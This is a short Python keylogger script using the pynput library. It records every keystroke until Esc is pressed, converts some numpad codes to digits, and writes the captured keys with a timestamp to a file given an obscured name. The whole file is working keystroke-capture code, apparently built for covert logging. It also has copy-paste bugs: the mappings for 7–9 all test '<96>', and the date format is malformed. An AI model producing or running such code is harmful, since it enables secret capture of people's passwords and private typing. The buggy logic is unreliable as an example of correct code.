# from pynput.keyboard import Key,Controller
# keyboard=Controller()
# keyboard.press(Key.space)
from datetime import datetime
from pynput import keyboard 
from pynput.keyboard import Key
l=[]
str1=""
str2=""
file=open("##&@#$%@.txt",'w')
with keyboard.Events() as events:
    
    for event in events:
        if event.key == Key.esc:
            break
        l.append(str(event.key))
       
for i in range(len(l)):
    if(l[i]=='<96>'):
        l[i]='0'
    if(l[i]=='<97>'):
        l[i]='1'
    if(l[i]=='<98>'):
        l[i]='2'
    if(l[i]=='<99>'):
        l[i]='3'
    if(l[i]=='<100>'):
        l[i]='4'
    if(l[i]=='<101>'):
        l[i]='5'
    if(l[i]=='<102>'):
        l[i]='6'
    if(l[i]=='<96>'):
        l[i]='7'
    if(l[i]=='<96>'):
        l[i]='8'
    if(l[i]=='<96>'):
        l[i]='9'

print(l)
    
str1=''.join(str(item) for item in l  )
now=datetime.now()
#print(str1)
dt_string = now.strftime("%d%m/%Y %H:%M:%S")

file.write(dt_string+str1)
file.close()



 